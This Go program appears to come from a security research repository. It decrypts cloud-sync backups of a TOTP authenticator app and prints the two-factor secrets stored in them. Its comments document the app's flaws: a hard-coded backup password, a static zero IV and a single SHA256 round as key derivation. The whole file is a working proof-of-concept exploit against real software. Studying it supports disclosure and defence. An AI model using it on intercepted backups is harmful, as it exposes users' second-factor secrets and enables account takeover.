package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"

	CryptoUtils "github.com/blues-lab/totp-app-analysis-public/utils"
	"main/utils"
)

const (
	// For cloud sync backups, the app uses this static, hard-coded password.
	password = "TotpAuthenticator"
)

type TotpBackups struct {
	TimeStamp      string
	TotpDataBase64 string `json:"totpData"`
}

func main() {
	// The app uses a static IV of all zeroes.
	ivBytes := bytes.Repeat([]byte{0}, 16)

	// A single round of SHA256 is used as a KDF.
	h := sha256.New()
	h.Write([]byte(password))
	keyBytes := h.Sum(nil)

	// The Base64 backup was copy/pasted from the network traffic. See the network
	// traffic example for help finding the request that contains the backup.
	ciphertextBase64, err := os.ReadFile("cloud_backup_ciphertext_base64.txt")
	if err != nil {
		panic(err)
	}
	ciphertextBytes, _ := base64.StdEncoding.DecodeString(string(ciphertextBase64))

	// Decrypt the TOTP backup using AES-CBC.
	backupPlaintextBytes := CryptoUtils.DecryptAesCbcPaddedWithPKCS7(
		ciphertextBytes,
		keyBytes,
		ivBytes)
	// fmt.Println("Encrypted Backup = ", string(backupPlaintextBytes))

	// Parse the JSON array in the decrypted plaintext.
	var totpBackups []TotpBackups
	json.Unmarshal(backupPlaintextBytes, &totpBackups)

	// Each entry of the JSON array is one TOTP account. Each TOTP account is
	// encrypted individually using the same key and IV that were used to encrypt
	// the top level JSON array. This nesting of encryption does not provide any
	// additional security.
	for i, totpBackup := range totpBackups {
		ciphertextBytes, err := base64.StdEncoding.DecodeString(totpBackup.TotpDataBase64)
		if err != nil {
			panic(err)
		}
		plaintextBytes := CryptoUtils.DecryptAesCbcPaddedWithPKCS7(
			ciphertextBytes,
			keyBytes,
			ivBytes)
		fmt.Printf("TOTP backup #%d: %s\n", i+1, string(plaintextBytes))
		fmt.Println("Note that the totpSecrets are included in the backup as hex.")

		utils.FindDecodeAndPrintHexTotpSecrets(plaintextBytes)
		fmt.Printf("\n\n\n")
	}
}
